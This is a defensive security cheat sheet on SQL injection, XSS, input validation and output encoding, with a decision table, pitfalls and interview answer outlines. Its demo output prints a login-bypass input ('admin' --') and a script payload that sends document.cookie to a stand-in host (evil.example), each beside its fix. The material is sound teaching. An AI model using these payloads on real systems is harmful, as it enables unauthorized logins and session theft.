---
title: "Cheat Sheet: Injection, Input Validation, and Output Encoding"
slug: injection-input-validation-output-encoding
document_type: cheat-sheet
domain: security
topic_id: T-1305
canonical: ../handbook/security/injection-input-validation-output-encoding.md
last_updated: 2026-08-05
---

# Injection, Input Validation, and Output Encoding

**Canonical chapter:** [`syllabus/12-security/injection-input-validation-output-encoding.md`](../syllabus/12-security/injection-input-validation-output-encoding.md)

## Core Mental Model

Every injection vulnerability has the same shape: an interpreter (SQL engine, shell, HTML renderer, template engine) receives a string built by concatenating trusted syntax with untrusted data, and cannot tell where trusted ends and untrusted begins — so untrusted data containing the interpreter's own special characters gets parsed as more syntax instead of inert data. The fix is always the same shape too: keep data and syntax in genuinely separate channels, so the interpreter never has to guess.

## Essential Definitions

- **Injection** — untrusted input incorporated into a command, query, or output stream in a way that alters that stream's intended structure, rather than being treated purely as data.
- **Input validation** — rejects/normalizes untrusted input against an expected shape *before* use. Necessary but not sufficient — can't anticipate every context the data will eventually flow into.
- **Output encoding** — transforms data into a form guaranteed inert in the *specific* context it's about to render into (HTML body, HTML attribute, URL, JS string, SQL parameter). The defense that actually prevents injection at the point of use.
- **Parameterization** — sends query structure and parameter values as separate protocol messages; the database compiles the structure first and binds values as pure data, never re-parsed as syntax. A stronger guarantee than escaping.

## Decision Table

| Context | Correct defense | Wrong tool trap |
|---|---|---|
| SQL query | Parameterized query / prepared statement | String concatenation, even with "escaping" |
| SQL identifier (column/table name) | Allowlist validation (parameters can't bind identifiers) | Accepting an arbitrary string |
| HTML body | HTML-entity encoding | Generic/no sanitization |
| HTML attribute, JS string, URL | Context-specific encoding (different rules per context) | Reusing HTML-body encoding everywhere |
| Shell command | Avoid shelling out to untrusted input; use APIs instead | String-concatenated shell commands |

**Trade-offs:** strict input validation reduces attack surface early but risks false-positive rejection of legitimate input (a name field rejecting apostrophes breaks "O'Brien"); output encoding is more foundational and harder to bypass, but must be applied correctly at every single point of use — one missed consumer reopens the vulnerability regardless of how well every other consumer is protected.

## Key Numbers (real, executed — live PostgreSQL 16, `SqlInjectionDemo.java` / `OutputEncodingDemo.java`)

```
VULNERABLE login, username="admin' --":
  executed SQL: SELECT * FROM users WHERE username = 'admin' --' AND password_hash = 'anything'
  login succeeded (no valid password given)? true

FIXED login, same attacker input, PreparedStatement:
  login succeeded? false   <- username literally "admin' --" doesn't exist
```

```
VULNERABLE render: <div>...<script>fetch('https://evil.example/steal?c='+document.cookie)</script></div>
  Contains a live <script> tag? true

FIXED render, output-encoded: &lt;script&gt;fetch(&#39;...&#39;...)&lt;/script&gt;
  Contains a live <script> tag? false   <- inert, displayed as literal text
```

`--` is PostgreSQL's line-comment syntax — everything after it is discarded before evaluation, so the password check never runs. The fixed version binds the string as a literal parameter; it's never re-parsed as SQL.

## Common Pitfalls

- Believing input validation alone ("we reject any input containing a single quote") is sufficient — it's a helpful early filter, not a substitute for parameterization or encoding at the point of use.
- Using one general-purpose "sanitize" function for all output contexts instead of context-specific encoding.
- Assuming a codebase is safe because most queries are parameterized — a single concatenated fragment anywhere reopens the vulnerability.
- Conflating "escaping" with "parameterization" — prepared statements' guarantee comes from channel separation, not better escaping.

## Interview Answer Skeleton

**30-sec:** Injection is untrusted data interpreted as syntax instead of data — SQL, shell, HTML all share this failure shape. Input validation is an early, coarse filter, necessary but not sufficient. The actual defense keeps data and syntax in separate channels: parameterized queries for SQL, context-specific output encoding for rendering — applied at every point of use.

**2-min:** Add why concatenation keeps causing this (the most natural, obvious way to build a query or render output, and exactly the pattern that fails when data contains the interpreter's special characters) + the real evidence (a live authentication bypass via `admin' --`, fixed by a `PreparedStatement`; a real stored-XSS payload, neutralized by HTML-entity encoding) + the trade-off (validation risks false positives and is never sufficient alone; encoding must be reapplied correctly at every new consumer).

**Whiteboard:** An interpreter box receiving one incoming arrow labeled "query/output string," built from adjacent puzzle pieces ("trusted syntax" + "untrusted data") with no visible seam — circle the seam: "the interpreter can't tell where trusted ends." Redraw the fix as two separate arrows: "query structure (trusted)" and "parameter values (data only, never re-parsed)."

**Staff-level framing:** encoding protection is per-consumption-point and doesn't propagate to new code paths automatically — a comment system correctly escaped for HTML rendering can still be vulnerable when a later feature reuses the raw data in an email-notification path with no encoding. Centralize rendering/query-building through shared, well-tested utilities specifically to shrink the surface where a new consumer could reintroduce the vulnerability.

## Production Warning Signs

- A search feature's `LIKE` clause passes an automated SQL-injection scanner cleanly but is vulnerable to a pattern the scanner didn't test (wildcard-context escaping) — automated scanning is useful but incomplete; the architectural fix (parameterize, including `LIKE` wildcard characters as data) closes the entire class regardless of which pattern a scanner happens to check.
- User content renders correctly as plain text in one part of the app but executes as markup/script in another — the signature of context-specific encoding applied inconsistently; encoding at the original render point doesn't automatically protect a new consumer of the same data.
- **Prevention:** default every database access path through parameterized queries with zero exceptions, and centralize output encoding through a small number of well-tested, context-specific utilities rather than hand-rolling escaping at each call site.

## Related

- `syllabus/12-security/owasp-top-10-for-backend-services.md`
- `syllabus/06-databases/query-planning-and-explain-analyze.md`
